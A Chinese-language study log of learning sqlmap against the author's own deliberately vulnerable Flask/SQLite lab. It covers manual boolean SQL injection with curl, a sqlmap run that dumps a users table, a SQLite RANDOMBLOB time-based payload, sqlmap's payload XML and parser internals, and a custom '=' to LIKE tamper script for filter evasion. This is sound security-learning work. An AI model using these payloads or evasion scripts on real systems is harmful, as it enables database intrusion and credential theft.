# sqlmap 真正学到了什么 (2026-06-07)

## 实战记录

### 环境搭建
- 安装: `pip install sqlmap` → sqlmap 1.10.6
- 靶场: Flask + SQLite，自己写的 vuln_server.py
- 注入点: `/user?id=1'` — WHERE id = '{uid}' (字符串拼接)
- 目标模拟: SELECT * FROM users WHERE id = '1'

### 手动验证
```bash
# 正常
curl -s -G "http://127.0.0.1:5000/user" --data-urlencode "id=1"
# → User: admin (ID: 1)

# True (AND '1'='1')
curl -s -G "http://127.0.0.1:5000/user" --data-urlencode "id=1' AND '1'='1"
# → User: admin (ID: 1)  [跟原始一样]

# False (AND '1'='2')
curl -s -G "http://127.0.0.1:5000/user" --data-urlencode "id=1' AND '1'='2"
# → No results found  [完全不一样]
```

### sqlmap 扫描结果
```bash
sqlmap -u "http://127.0.0.1:5000/user?id=1" --batch
# 66 次 HTTP 请求
# ✓ AND boolean-based blind (4652=4652 pattern)
# ✓ SQLite > 2.0 AND time-based blind (RANDOMBLOB heavy query)
# ✓ Generic UNION query (NULL) - 4 columns
# ✓ DBMS = SQLite
# ✓ 2 tables (users, products)
# ✓ Dump users → 4条记录含密码
```

### SQLite 时间盲注的坑
sqlmap 对 SQLite 的时间盲注使用 `LIKE(CHAR(...), UPPER(HEX(RANDOMBLOB(500000000/2))))` 
而不是标准的 SLEEP()。因为 SQLite 没有 SLEEP 函数！用大 blob 的哈希计算模拟延迟。
payload: `1' AND 1234=LIKE(CHAR(65,66,...), UPPER(HEX(RANDOMBLOB(500000000/2)))) AND '1'='1`

## XML 结构 (payloads/boolean_blind.xml)

### `<test>` 结构
```xml
<test>
    <title>AND boolean-based blind - WHERE or HAVING clause</title>
    <stype>1</stype>           <!-- 1=Boolean 2=Error 3=Inline 4=Stacked 5=Time 6=UNION -->
    <level>1</level>           <!-- 1-5: 检测深度 -->
    <risk>1</risk>             <!-- 1-3: 数据损坏风险 -->
    <clause>1,8,9</clause>     <!-- 0=Always 1=WHERE 2=GROUP 3=ORDER 4=LIMIT ... -->
    <where>1</where>           <!-- 1=追加到原值 2=用负数替换原值再追加 3=完全替换 -->
    <vector>AND [INFERENCE]</vector>
    <request>
        <payload>AND [RANDNUM]=[RANDNUM]</payload>
    </request>
    <response>
        <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
    </response>
</test>
```

test × boundary = 完整测试用例。一个 test 有 level=1, risk=1 → 在所有 level≥1 的扫描中被使用。

### `<boundary>` 结构
```xml
<boundary>
    <level>3</level>            <!-- 层3边界只被--level>=3的扫描使用 -->
    <clause>1</clause>
    <where>1,2</where>
    <ptype>1</ptype>            <!-- 1=数字 2=单引号字符串 3=LIKE单引号 4=双引号 ... -->
    <prefix>)</prefix>
    <suffix>[GENERIC_SQL_COMMENT]</suffix>
</boundary>
```

ptype 是关键：数字参数（id=1）用不带引号的边界优先，文本参数用带引号的。

## XML 解析引擎 (lib/parse/payloads.py)

```python
# 关键函数
parseXmlNode(node):
    for element in node.findall("boundary"):
        boundary = AttribDict()  # 类字典，属性访问
        for child in element.findall("*"):
            values = cleanupVals(child.text, child.tag)
            boundary[child.tag] = values
        conf.boundaries.append(boundary)  # 存到全局配置
    
    for element in node.findall("test"):
        test = AttribDict()
        for child in element.findall("*"):
            if child.text and child.text.strip():
                values = cleanupVals(child.text, child.tag)
                test[child.tag] = values
            else:
                progeny = child.findall("*")
                test[child.tag] = AttribDict()
                for gchild in progeny:
                    test[child.tag][gchild.tag] = gchild.text
        conf.tests.append(test)  # 存到全局配置

loadBoundaries():
    doc = et.parse(paths.BOUNDARIES_XML)
    parseXmlNode(doc.getroot())

loadPayloads():
    for payloadFile in PAYLOAD_XML_FILES:  # 每个技术一个文件
        doc = et.parse(payloadFilePath)
        parseXmlNode(doc.getroot())
```

cleanupVals() 处理：
- `clause="1,8,9"` → split(",") → [1,8,9]
- `clause="1-3"` → rangeExpand → [1,2,3]
- `level="1"` → int(1)

## Tamper 脚本系统 (lib/tamper/)

### 函数式设计
```python
__priority__ = PRIORITY.NORMAL  # 执行顺序控制

def dependencies():
    pass  # 检查依赖，如特定DBMS

def tamper(payload, **kwargs):
    # 接收 payload 字符串，返回修改后的字符串
    retVal = payload
    if payload:
        retVal = retVal.replace(...)
    return retVal
```

### 执行机制
```python
# 在 agent.py payload() 方法中
if kb.tamperFunctions:
    for function in kb.tamperFunctions:
        query = function(payload=query)
```

### 我写的 tamper 验证成功
```python
# bliiot_test.py — 把 = 替换成 LIKE
import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = re.sub(r'\s*=\s*', ' LIKE ', retVal)
    return retVal

# 运行验证
sqlmap -u "..." --tamper=bliiot_test --batch
# 输出中 148 处 LIKE 出现 → tamper工作
# 实际HTTP请求: id=1%29%20AND%204292%20LIKE%205170
```

### 正则选择注意事项
`\s*=\s*` 比 `(?<=\s)=(\s)` 好。因为 `4652=4652` 等号两侧**没有空格**时，后一个不匹配。

## 二维测试组合

总数 = |tests| × |boundaries| × 匹配条件

例如 level=1 的扫描：
- boolean_blind.xml 约40条 test（仅level≤1）
- boundaries.xml 约20条 boundary（仅level≤1）
- 组合后约 800 个测试
- 每种技术找到后立即停止后续（`if injection.data and stype in injection.data: continue`）

## checks.py 主要逻辑

1. **参数类型检测**: 数字值优先用整型边界，字母值优先字符串边界
2. **tests排序**: level/risk升序，越简单的越先试
3. **favor边界**: 根据 value 类型调整 boundary 优先级
4. **检测到注入立刻 break**: 不浪费后续测试
5. **多技术独立**: Boolean找到了不会跳过 UNION 测试

## 安全工具的"真学习"方法论（补充）

跟嵌入式项目不同，安全工具的验证阶梯是：

```
① pip install → ② 搭靶场 → ③ curl手动验证 → 
④ 工具批量跑 → ⑤ 读源码理解原理 → 
⑥ 写自己的扩展 → ⑦ 验证扩展 → ⑧ 存档
```

关键：**第⑥步**（写自己的扩展）是验证是否真正理解设计模式的唯一方式。能写出一个能用的 tamper 脚本装在 sqlmap 里跑通，比看 100 篇架构分析文章都更能证明学会了。